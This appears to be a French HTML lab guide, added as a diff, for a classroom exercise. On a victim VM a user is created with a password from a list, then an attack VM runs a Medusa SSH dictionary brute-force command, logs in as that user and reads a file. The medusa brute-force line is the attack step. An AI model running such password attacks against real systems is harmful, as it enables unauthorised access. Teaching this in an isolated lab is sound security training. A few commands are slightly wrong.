@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles-etapes.css">
+
+    <title>Document</title>
+</head>
+
+<body>
+    <div class="VM">
+        Machine : Victime
+        <div class="Etape">
+            <div class="Etape-Titre">Se connecter à la victime</div>
+            1. Ouvrir CMD (Invite de commande) <br> <br>
+        
+            2. Entrer la commande <br>
+            <div class="Code">
+                <div class="Code-Chemin">C:\Users\utilisateur></div> ssh [utilisateur]@[adresse IP] -p [numéro de port]
+            </div> <br>
+            3. Appuyer sur 'y' pour confirmer <br><br>
+
+            4. Écrire le mot de passe
+        </div>
+        <div class="Etape">
+            <div class="Etape-Titre"> Créer l'utilisateur victime</div>
+            1. Choisir un mot de passe dans la liste des mots de passe <br> <br>
+            2. Creer l'utilisateur avec la commande suivante
+            <div class="Code">
+                <div class="Code-Chemin">utilisateur@victime:~$</div> sudo adduser [nomDeLaVictime]
+            </div> <br>
+            3. Inscrire le mot de passe. ATTENTION: On ne voit pas ce que l'on écrit
+            <div>
+            </div>
+        </div>
+
+        <div class="Etape">
+            <div class="Etape-Titre">Se connecter avec le nouvel utilisateur</div>
+            1. Entrer la commande <br>
+            <div class="Code">
+                <div class="Code-Chemin">utilisateur@victime:~$  </div> su [nomDeLaVictime]
+            </div><br>
+            2. Entrer le mot de passe
+        </div>
+
+        <div class="Etape">
+            <div class="Etape-Titre">Creer un fichier texte</div>
+            1. Verifier la position
+            <div class="Code">pwd ou nomDeLaVictime@victime:~$ cd/home/[nomDeLaVictime]</div> <br>
+
+            2. Creer un fichier
+            <div class="Code">
+                <div class="Code-Chemin">nomDeLaVictime@victime:~$ </div>nano reponse.txt</div> 
+
+                &emsp;Copier le dictionnaire: Ctrl + c <br>
+                &emsp;Coller le dictionnaire: Ctrl + v <br>
+                &emsp;Puis, appuyer sur ENTRER <br> <br>
+                &emsp;Fermer le fichier: Ctrl + x , <br>
+                &emsp;Appuyer sur 'y' pour confirmer<br>
+                &emsp;Puis, appuyer sur ENTRER 
+
+        </div>
+
+    </div>
+
+
+
+
+    <div class="VM">
+        Machine : Attaque
+        
+        <div class="Etape">
+            <div class="Etape-Titre">Se connecter a l'attaque</div>
+
+            1. Ouvrir un autre CMD (Invite de commande) <br> <br>
+            
+            2. Executer la commande suivante
+            <div class="Code">
+                <div class="Code-Chemin">C:\Users\exemple></div>ssh [utilisateur]@[adresse IP] -p [numéro de port]</div>
+            <br>
+            3. Appuyer sur 'y' pour confirmer
+            <br> <br>
+            4. Entrer le mot de passe
+        </div>
+
+
+
+        <div class="Etape">
+            <div class="Etape-Titre">Preparer l'attaque</div>
+
+            1. Voir le dictionnaire
+            <div class="Code">pwd</div>
+            <div class="Code">ls</div> <br>
+            2. Determiner le port et le nom de la victime <br> <br>
+            3. Executer la commande suivante
+            <div class="Code">
+                <div class="Code-Chemin">C:\Users\exemple></div> ping [adresse IP]</div>
+            <br>
+
+        </div>
+
+        <div class="Etape">
+            <div class="Etape-Titre">Lancer l'attaque</div>
+
+            1. Executer la commande
+            <div class="Code">
+                <div class="Code-Chemin">user@superhéros:~$ </div>medusa -h [adresseIP] -u [nomVictime] -p /dictionnaire/dictionnaire.txt -n [numérodeport] -M ssh -v 6</div>
+
+        </div>
+
+        <div class="Etape">
+            <div class="Etape-Titre">Se connecter à la victime</div>
+
+            1. Se connecter à la victime
+            <div class="Code">
+                <div class="Code-Chemin">user@superhéros:~$ </div>ssh [victime]@adresseIP -p [numérodeportDeLaVictime]</div>
+                <br>
+            2. Verifier l'utilisateur et la Machine
+            <div class="Code">
+                <div class="Code-Chemin">user@superhéros:~$ </div>whoami -u</div>
+                <br>
+           
+
+
+        </div>
+        <div class="Etape">
+            <div class="Etape-Titre">Ouvrir la liste des documents sur l'ordinateur de la victime</div>
+            1. Trouver le fichier
+            <div class="Code">
+                <div class="Code-Chemin">victime@<strong>victime</strong>:~$ </div>ls</div> <br>
+            2. Ouvrir le fichier
+            <div class="Code">
+                <div class="Code-Chemin">victime@victime:~$ </div> pwd</div> <br>
+            3. Afficher le message
+                <div class="Code">
+                    <div class="Code-Chemin">utilisateur@nomdusuperhéros:~$  </div> cat reponse.txt</div>
+    
+
+        </div>
+
+
+
+    </div>
+
+
+</body>
+
+</html>
